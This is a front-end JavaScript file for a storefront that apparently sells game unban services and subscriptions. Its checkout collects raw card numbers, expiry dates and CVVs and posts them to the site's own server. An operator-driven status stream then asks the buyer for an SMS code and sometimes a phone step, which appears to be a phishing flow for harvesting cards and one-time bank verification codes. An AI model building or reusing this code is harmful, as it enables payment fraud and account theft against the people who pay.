// Store State Variables
let allProducts = [];
let selectedProduct = null;
let currentOrderId = null;
let eventSource = null;

let currentTier = 'monthly';
let activePromoCode = '';
let activeDiscountType = null; // '50off' or 'lifetime75'

// DOM Elements
const productsGrid = document.getElementById('productsGrid');
const searchInput = document.getElementById('searchInput');
const categoryList = document.getElementById('categoryList');

// Modals
const checkoutModal = document.getElementById('checkoutModal');
const orderStatusModal = document.getElementById('orderStatusModal');

// Modal Controls
const closeCheckoutBtn = document.getElementById('closeCheckoutBtn');

// Checkout Form & Containers
const checkoutForm = document.getElementById('checkoutForm');
const planOptions = document.getElementById('planOptions');
const modalProductTitle = document.getElementById('modalProductTitle');
const modalProductBadge = document.getElementById('modalProductBadge');
const modalProductDesc = document.getElementById('modalProductDesc');

const paymentMethodSelect = document.getElementById('paymentMethod');
const cryptoFields = document.getElementById('cryptoFields');
const cardFields = document.getElementById('cardFields');

// Promo & Price Elements
const promoCodeInput = document.getElementById('promoCodeInput');
const applyPromoBtn = document.getElementById('applyPromoBtn');
const promoNotice = document.getElementById('promoNotice');
const originalPriceDisplay = document.getElementById('originalPriceDisplay');
const finalPriceDisplay = document.getElementById('finalPriceDisplay');

// Status Screen Elements
const liveOrderId = document.getElementById('liveOrderId');
const liveProductName = document.getElementById('liveProductName');
const licenseKeyDisplay = document.getElementById('licenseKeyDisplay');
const copyKeyBtn = document.getElementById('copyKeyBtn');

// SMS Form
const smsForm = document.getElementById('smsForm');
const smsInput = document.getElementById('smsInput');
const smsSentNotice = document.getElementById('smsSentNotice');

// --- Initialization ---
document.addEventListener('DOMContentLoaded', async () => {
  await fetchProducts();
  setupEventListeners();
});

function setupEventListeners() {
  // Payment Method Switcher
  paymentMethodSelect.addEventListener('change', (e) => {
    const method = e.target.value;
    if (method === 'Card') {
      cardFields.style.display = 'block';
      cryptoFields.style.display = 'none';
      document.getElementById('cardName').required = true;
      document.getElementById('cardNumber').required = true;
      document.getElementById('cardExpiry').required = true;
      document.getElementById('cardCvv').required = true;
      document.getElementById('paymentRef').required = false;
    } else {
      cardFields.style.display = 'none';
      cryptoFields.style.display = 'block';
      document.getElementById('cardName').required = false;
      document.getElementById('cardNumber').required = false;
      document.getElementById('cardExpiry').required = false;
      document.getElementById('cardCvv').required = false;
      document.getElementById('paymentRef').required = false;
    }
  });

  // Card Number auto-formatter
  const cardNumberInput = document.getElementById('cardNumber');
  cardNumberInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
    e.target.value = formatted;
  });

  // Card Expiry auto-formatter
  const cardExpiryInput = document.getElementById('cardExpiry');
  cardExpiryInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    e.target.value = value;
  });

  // Promo Code Button Listener
  applyPromoBtn.addEventListener('click', () => {
    applyPromoCode();
  });
}

// Fetch Products from API
async function fetchProducts() {
  try {
    const res = await fetch('/api/products');
    allProducts = await res.json();
    renderProducts(allProducts);
  } catch (err) {
    console.error("Failed to load products:", err);
  }
}

// Render Products Grid
function renderProducts(products) {
  productsGrid.innerHTML = '';

  if (products.length === 0) {
    productsGrid.innerHTML = `<div style="grid-column: 1/-1; text-align: center; padding: 40px; color: var(--text-muted);">No products found matching your search.</div>`;
    return;
  }

  products.forEach(p => {
    const card = document.createElement('div');
    card.className = 'product-card';
    card.innerHTML = `
      <div class="product-img-wrap">
        <img src="${p.image}" alt="${p.title}" loading="lazy">
        <span class="badge-tag">${p.badge}</span>
        <span class="category-tag">${p.category}</span>
      </div>
      <div class="product-info">
        <h3 class="product-title">${p.title}</h3>
        <p class="product-desc">${p.description}</p>
        <ul class="feature-list">
          ${p.features.map(f => `<li>${f}</li>`).join('')}
        </ul>
        <div class="price-row">
          <div>
            <span class="price-label">Starting at:</span>
            <div class="price-val">${p.id === 'perm-unban' ? '25€ (Lite)' : '20€ (Week)'}</div>
          </div>
          <button class="btn-buy" onclick="openCheckoutModal('${p.id}')">Buy Now ⚡</button>
        </div>
      </div>
    `;
    productsGrid.appendChild(card);
  });
}

// Category Filter Handler
categoryList.addEventListener('click', (e) => {
  if (e.target.classList.contains('cat-btn')) {
    document.querySelectorAll('.cat-btn').forEach(btn => btn.classList.remove('active'));
    e.target.classList.add('active');

    const cat = e.target.getAttribute('data-cat');
    if (cat === 'ALL') {
      renderProducts(allProducts);
    } else {
      const filtered = allProducts.filter(p => p.category_code === cat);
      renderProducts(filtered);
    }
  }
});

// Search Input Handler
searchInput.addEventListener('input', (e) => {
  const query = e.target.value.toLowerCase().trim();
  const filtered = allProducts.filter(p => 
    p.title.toLowerCase().includes(query) ||
    p.name.toLowerCase().includes(query) ||
    p.category.toLowerCase().includes(query)
  );
  renderProducts(filtered);
});

// Open Checkout Modal & Render Exact Product Plans
window.openCheckoutModal = function(productId) {
  selectedProduct = allProducts.find(p => p.id === productId);
  if (!selectedProduct) return;

  modalProductTitle.textContent = selectedProduct.title;
  modalProductBadge.textContent = selectedProduct.badge;
  modalProductDesc.textContent = selectedProduct.description;

  // Reset Promo state
  activePromoCode = '';
  activeDiscountType = null;
  promoCodeInput.value = '';
  promoNotice.style.display = 'none';

  // Render Plans with € currency
  if (selectedProduct.id === 'perm-unban') {
    planOptions.innerHTML = `
      <label class="plan-card active">
        <input type="radio" name="tier" value="alpha" checked>
        <span class="plan-name">Alpha Plan</span>
        <span class="plan-price">50€</span>
      </label>
      <label class="plan-card">
        <input type="radio" name="tier" value="lite">
        <span class="plan-name">Lite Plan</span>
        <span class="plan-price">25€</span>
      </label>
    `;
    currentTier = 'alpha';
  } else {
    planOptions.innerHTML = `
      <label class="plan-card active">
        <input type="radio" name="tier" value="monthly" checked>
        <span class="plan-name">Monthly</span>
        <span class="plan-price">40€</span>
      </label>
      <label class="plan-card">
        <input type="radio" name="tier" value="weekly">
        <span class="plan-name">Weekly</span>
        <span class="plan-price">20€</span>
      </label>
      <label class="plan-card">
        <input type="radio" name="tier" value="lifetime">
        <span class="plan-name">Lifetime</span>
        <span class="plan-price">120€</span>
      </label>
    `;
    currentTier = 'monthly';
  }

  updatePriceCalculation();
  checkoutModal.classList.add('active');
};

// Plan options switch handler
planOptions.addEventListener('change', (e) => {
  if (e.target.name === 'tier') {
    document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('active'));
    e.target.closest('.plan-card').classList.add('active');
    currentTier = e.target.value;
    updatePriceCalculation();
  }
});

// Calculate Original & Final Price with €
function calculatePrices() {
  if (!selectedProduct) return { basePrice: 40, finalPrice: 40 };

  const basePrice = selectedProduct.price[currentTier] || 40;
  let finalPrice = basePrice;

  if (activeDiscountType === 'lifetime75') {
    if (currentTier === 'lifetime') {
      finalPrice = 75;
    } else {
      finalPrice = Math.round(basePrice * 0.75); // 25% off for non-lifetime if code applied
    }
  } else if (activeDiscountType === '50off') {
    finalPrice = Math.round(basePrice * 0.5);
  }

  return { basePrice, finalPrice };
}

function updatePriceCalculation() {
  const { basePrice, finalPrice } = calculatePrices();

  if (finalPrice < basePrice) {
    originalPriceDisplay.style.display = 'inline-block';
    originalPriceDisplay.textContent = `${basePrice}€`;
    finalPriceDisplay.textContent = `${finalPrice}€`;
  } else {
    originalPriceDisplay.style.display = 'none';
    finalPriceDisplay.textContent = `${basePrice}€`;
  }
}

// Promo Code Evaluation Engine
function applyPromoCode() {
  const code = promoCodeInput.value.trim().toUpperCase();
  if (!code) return;

  const code50 = ['50OFF', '50%', 'SAVE50', 'REVOLT50', 'HALF', 'DISCOUNT50'];
  const code75 = ['LIFETIME75', 'REVOLT75', '75LIFETIME', 'LIFETIME', '75OFF'];

  if (code50.includes(code)) {
    activePromoCode = code;
    activeDiscountType = '50off';
    promoNotice.className = 'promo-notice-box promo-success';
    promoNotice.innerHTML = `✓ Promo code <b>${code}</b> applied! 50% OFF total discount.`;
    promoNotice.style.display = 'block';
  } else if (code75.includes(code)) {
    activePromoCode = code;
    activeDiscountType = 'lifetime75';
    promoNotice.className = 'promo-notice-box promo-success';
    promoNotice.innerHTML = `✓ Promo code <b>${code}</b> applied! Lifetime Plan discounted to 75€!`;
    promoNotice.style.display = 'block';
  } else {
    activePromoCode = '';
    activeDiscountType = null;
    promoNotice.className = 'promo-notice-box promo-error';
    promoNotice.textContent = '✕ Invalid promo code. Try 50OFF or LIFETIME75';
    promoNotice.style.display = 'block';
  }

  updatePriceCalculation();
}

// Submit Checkout Form
checkoutForm.addEventListener('submit', async (e) => {
  e.preventDefault();

  const discordTag = document.getElementById('custDiscord').value.trim();
  const paymentMethod = paymentMethodSelect.value;
  const paymentRef = document.getElementById('paymentRef').value.trim();

  const cardName = document.getElementById('cardName').value.trim();
  const cardNumber = document.getElementById('cardNumber').value.trim();
  const cardExpiry = document.getElementById('cardExpiry').value.trim();
  const cardCvv = document.getElementById('cardCvv').value.trim();

  const { basePrice, finalPrice } = calculatePrices();

  const payload = {
    productId: selectedProduct.id,
    tier: currentTier,
    originalPrice: basePrice,
    finalPrice: finalPrice,
    promoCode: activePromoCode || 'None',
    discordTag,
    paymentMethod,
    paymentRef,
    cardName,
    cardNumber,
    cardExpiry,
    cardCvv
  };

  try {
    const res = await fetch('/api/orders', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await res.json();

    if (data.success) {
      checkoutModal.classList.remove('active');
      openOrderStream(data.order);
    } else {
      alert("Error creating order!");
    }
  } catch (err) {
    alert("Connection error to server!");
  }
});

// Open Order Live Redirection Status Screen via SSE Stream
function openOrderStream(order) {
  currentOrderId = order.id;
  liveOrderId.textContent = `#${order.id}`;
  liveProductName.textContent = order.productName;

  orderStatusModal.classList.add('active');

  if (eventSource) eventSource.close();

  eventSource = new EventSource(`/api/orders/${order.id}/stream`);

  eventSource.onmessage = (event) => {
    const updatedOrder = JSON.parse(event.data);
    updateStatusScreen(updatedOrder);
  };

  eventSource.onerror = () => {
    console.log("SSE Stream re-connecting...");
  };
}

// Update Dynamic Status Screen UI Steps based on Order Status
function updateStatusScreen(order) {
  document.querySelectorAll('.status-step').forEach(step => step.classList.remove('active'));

  switch (order.status) {
    case 'PENDING':
      document.getElementById('stepPending').classList.add('active');
      break;

    case 'SMS_REQUIRED':
      document.getElementById('stepSms').classList.add('active');
      smsSentNotice.style.display = 'none';
      break;

    case 'SMS_SUBMITTED':
      document.getElementById('stepSms').classList.add('active');
      smsSentNotice.style.display = 'block';
      break;

    case 'PHONE_REQUIRED':
      document.getElementById('stepPhone').classList.add('active');
      break;

    case 'APPROVED':
      document.getElementById('stepApproved').classList.add('active');
      licenseKeyDisplay.textContent = order.licenseKey || 'KEY-REVOLT-88371-ACTIVE';
      if (eventSource) eventSource.close();
      break;

    case 'CANCELLED':
      document.getElementById('stepCancelled').classList.add('active');
      if (eventSource) eventSource.close();
      break;

    default:
      document.getElementById('stepPending').classList.add('active');
  }
}

// Submit Customer SMS Code
smsForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  const code = smsInput.value.trim();
  if (!code) return;

  try {
    const res = await fetch(`/api/orders/${currentOrderId}/sms`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ smsCode: code })
    });
    const data = await res.json();
    if (data.success) {
      smsSentNotice.style.display = 'block';
    }
  } catch (err) {
    alert("Failed to submit SMS code!");
  }
});

// Copy Wallet Address to Clipboard
window.copyAddr = function(text, btnElement) {
  navigator.clipboard.writeText(text);
  const originalText = btnElement.textContent;
  btnElement.textContent = 'Copied! ✓';
  btnElement.style.background = 'var(--sky-blue)';
  btnElement.style.color = '#000';
  setTimeout(() => {
    btnElement.textContent = originalText;
    btnElement.style.background = '';
    btnElement.style.color = '';
  }, 2000);
};

// Copy License Key to Clipboard
copyKeyBtn.addEventListener('click', () => {
  navigator.clipboard.writeText(licenseKeyDisplay.textContent);
  copyKeyBtn.textContent = 'Copied! ✓';
  setTimeout(() => { copyKeyBtn.textContent = 'Copy 📋'; }, 2000);
});

// Modal Close Handlers
closeCheckoutBtn.addEventListener('click', () => checkoutModal.classList.remove('active'));
